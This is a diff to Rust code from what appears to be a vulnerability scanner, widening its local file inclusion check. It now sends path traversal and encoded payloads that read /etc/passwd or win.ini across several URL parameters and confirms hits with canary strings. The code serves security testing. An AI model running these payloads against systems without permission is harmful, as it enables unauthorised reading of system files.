@@ -542,6 +542,8 @@ pub async fn run_subdomain_takeover_result(target: &str) -> EngineResult {
 cli_wrapper!(run_subdomain_takeover, run_subdomain_takeover_result);
 
 // ── file_inclusion_rfi ────────────────────────────────────────────────────────
+// Strengthened: try Linux + Windows targets, URL-encoded + double-encoded variants, and reject
+// payload reflection without the canary content to avoid false positives.
 pub async fn run_file_inclusion_rfi_result(target: &str) -> EngineResult {
     if target.trim().is_empty() {
         return EngineResult::error("target required");
@@ -549,22 +551,47 @@ pub async fn run_file_inclusion_rfi_result(target: &str) -> EngineResult {
     let client = http_client().await;
     let base = normalize_url(target);
     let mut findings: Vec<Value> = Vec::new();
-    for q in ["file", "page", "path", "include", "doc"] {
-        let url = format!(
-            "{}/?{}=/etc/passwd",
-            base.trim_end_matches('/'),
-            q
-        );
-        if let Some(p) = http_get(&client, &url).await {
-            if p.body.contains("root:x:0:0") {
-                findings.push(finding(
-                    "file_inclusion_rfi",
-                    "LFI confirmed via /etc/passwd payload",
-                    "critical",
-                    "T1059",
-                    &format!("Response to ?{}=/etc/passwd on {} contains root:x:0:0", q, p.final_url),
-                    target,
-                ));
+
+    // (payload, canary substring that proves arbitrary file read)
+    let payloads: &[(&str, &str)] = &[
+        ("/etc/passwd",                                  "root:x:0:0"),
+        ("../../../../etc/passwd",                       "root:x:0:0"),
+        ("..%2f..%2f..%2fetc%2fpasswd",                  "root:x:0:0"),
+        ("..%252f..%252f..%252fetc%252fpasswd",          "root:x:0:0"),
+        ("C:%5CWindows%5Cwin.ini",                       "[fonts]"),
+        ("file:///etc/passwd",                           "root:x:0:0"),
+    ];
+    let params = ["file", "page", "path", "include", "doc", "f", "template"];
+
+    for q in params {
+        for (payload, canary) in payloads {
+            let url = format!(
+                "{}/?{}={}",
+                base.trim_end_matches('/'),
+                q,
+                payload
+            );
+            if let Some(p) = http_get(&client, &url).await {
+                // Avoid false positives when the server echoes the payload itself rather than the
+                // file contents. The canary string ('root:x:0:0' / '[fonts]') is the real proof.
+                if p.body.contains(canary) && !p.body.contains(payload) {
+                    let mut f = finding(
+                        "file_inclusion_rfi",
+                        &format!("LFI confirmed via ?{}={}", q, payload),
+                        "critical",
+                        "T1083",
+                        &format!(
+                            "Response to ?{}={} on {} contains the canary '{}' — file inclusion is confirmed.",
+                            q, payload, p.final_url, canary
+                        ),
+                        target,
+                    );
+                    if let Some(obj) = f.as_object_mut() {
+                        obj.insert("payload".into(), Value::String(payload.to_string()));
+                        obj.insert("parameter".into(), Value::String(q.to_string()));
+                    }
+                    findings.push(f);
+                }
             }
         }
     }
